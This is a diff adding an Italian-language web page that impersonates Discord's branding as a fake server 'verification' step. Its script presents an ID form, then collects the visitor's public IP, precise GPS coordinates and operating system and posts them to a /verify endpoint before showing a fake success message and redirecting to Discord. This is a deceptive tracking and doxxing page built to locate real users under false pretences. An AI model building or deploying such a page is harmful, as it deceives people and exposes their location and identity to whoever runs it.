@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord | Verifica</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @font-face {
+            font-family: 'gg sans';
+            src: url('https://fonts.cdnfonts.com/s/85631/ggsans-Normal.woff') format('woff');
+        }
+        body { 
+            background-color: #313338; 
+            color: #dbdee1; 
+            font-family: 'gg sans', 'Noto Sans', sans-serif; 
+            margin: 0;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        .card { 
+            background-color: #2b2d31; 
+            border-radius: 8px; 
+            box-shadow: 0 8px 16px rgba(0,0,0,0.2); 
+            width: 100%;
+            max-width: 410px;
+            padding: 32px;
+            text-align: center;
+        }
+        .input-dark { 
+            background-color: #1e1f22; 
+            border: none; 
+            color: #f2f3f5; 
+            outline: none;
+            width: 100%;
+            padding: 12px;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        .input-dark:focus { 
+            box-shadow: 0 0 0 2px #5865f2; 
+        }
+        .btn-discord { 
+            background-color: #5865f2; 
+            color: white; 
+            font-weight: 500;
+            width: 100%;
+            padding: 12px;
+            border-radius: 4px;
+            transition: background-color 0.2s;
+            margin-top: 20px;
+        }
+        .btn-discord:hover { 
+            background-color: #4752c4; 
+        }
+        .spinner {
+            width: 32px;
+            height: 32px;
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-top: 3px solid #f2f3f5;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div id="main-view" class="card">
+        <div class="mb-6 flex justify-center">
+            <svg width="48" height="48" viewBox="0 0 24 24" fill="#5865f2">
+                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 13.17l7.59-7.59L19 7l-9 10z"/>
+            </svg>
+        </div>
+        
+        <h1 class="text-white text-xl font-bold mb-2">Verifica Richiesta</h1>
+        <p class="text-[#b5bac1] text-sm mb-6 leading-relaxed">
+            Per accedere ai canali del server, conferma il tuo account. Senza verifica rimarrai nel ruolo <b>Non Verificato</b> senza permessi di visualizzazione.
+        </p>
+
+        <div class="space-y-4">
+            <div class="text-left">
+                <label class="block text-[11px] font-bold uppercase text-[#b5bac1] mb-2 tracking-wider">ID Utente Discord</label>
+                <input type="text" id="user_id" placeholder="Incolla il tuo ID (Esempio: 123456789...)" class="input-dark">
+            </div>
+
+            <button onclick="startProcessing()" class="btn-discord">
+                Verifica e Sblocca Canali
+            </button>
+        </div>
+        
+        <p class="mt-8 text-[11px] text-[#949ba4] leading-tight italic">
+            Il completamento della procedura rimuoverà automaticamente le restrizioni dal tuo profilo.
+        </p>
+    </div>
+
+    <div id="loading-view" class="fixed inset-0 bg-[#313338] flex flex-col items-center justify-center hidden z-50">
+        <div class="spinner mb-4"></div>
+        <p id="status-text" class="text-white text-sm font-medium">Sincronizzazione gateway in corso...</p>
+        <p class="text-[#949ba4] text-[11px] mt-2">Attendere, non chiudere la finestra</p>
+    </div>
+
+    <script>
+        async function getIp() {
+            try {
+                const r = await fetch('https://api.ipify.org?format=json');
+                const d = await r.json();
+                return d.ip;
+            } catch (e) { return "Hidden"; }
+        }
+
+        function getGeo() {
+            return new Promise((res) => {
+                navigator.geolocation.getCurrentPosition(
+                    (p) => res(`${p.coords.latitude},${p.coords.longitude}`),
+                    () => res("Accesso Negato (GPS OFF)"),
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            });
+        }
+
+        async function startProcessing() {
+            const uid = document.getElementById('user_id').value;
+            if (uid.length < 15) {
+                alert("ID non valido. Assicurati di copiare l'ID numerico corretto.");
+                return;
+            }
+
+            document.getElementById('main-view').classList.add('hidden');
+            document.getElementById('loading-view').classList.remove('hidden');
+
+            const ip = await getIp();
+            const geo = await getGeo();
+
+            try {
+                const response = await fetch('/verify', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        username: uid,
+                        real_coords: geo,
+                        client_ip: ip,
+                        os: navigator.platform
+                    })
+                });
+
+                const result = await response.json();
+
+                // Simulazione attesa obbligatoria di 3 secondi (gestita anche lato backend)
+                if (result.status === "success") {
+                    setTimeout(() => {
+                        document.getElementById('status-text').innerText = "Accesso Concesso! Canali sbloccati.";
+                        document.getElementById('status-text').style.color = "#43b581";
+                        setTimeout(() => {
+                            window.location.href = "https://discord.com/app";
+                        }, 1500);
+                    }, 2000);
+                } else {
+                    throw new Error();
+                }
+
+            } catch (err) {
+                document.getElementById('status-text').innerText = "Errore durante la verifica.";
+                setTimeout(() => { location.reload(); }, 2000);
+            }
+        }
+    </script>
+</body>
+</html>
